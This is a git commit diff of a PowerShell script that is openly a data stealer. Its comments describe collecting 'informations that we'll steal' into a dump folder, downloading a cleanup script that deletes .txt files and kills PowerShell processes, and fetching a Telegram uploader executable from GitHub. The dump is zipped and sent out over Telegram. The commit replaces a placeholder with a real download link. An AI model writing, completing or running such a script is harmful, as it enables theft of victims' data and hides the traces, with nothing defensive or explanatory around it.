e56f035d917cf0e4090ba0345cf00040123d78d5
PLESSY Franck <90218895+PFranck06@users.noreply.github.com>
2024-02-10 10:19:37 +0100

    Add files via upload

--- ciaoV2_upload.ps1
+++ ciaoV2_upload.ps1
@@ -6,7 +6,7 @@ mkdir dump
 #Create dump/ directory to put all informations that we'll steal in it
 Invoke-WebRequest https://github.com/PFranck06/HowardTelegram/blob/main/fin_upload.ps1 -OutFile fin_upload.ps1 
 #Download final .ps1 file to delete all .txt files and stop all powershell process
-Invoke-WebRequest LINK -OutFile telegram_uploader.exe 
+Invoke-WebRequest https://github.com/PFranck06/HowardTelegram/blob/main/telegram_uploader.exe -OutFile telegram_uploader.exe 
 #Download uploader file to upload all informations on telegram
 Compress-Archive dump/ dump.zip 
 #Compress dump/ folder to upload it on telegram
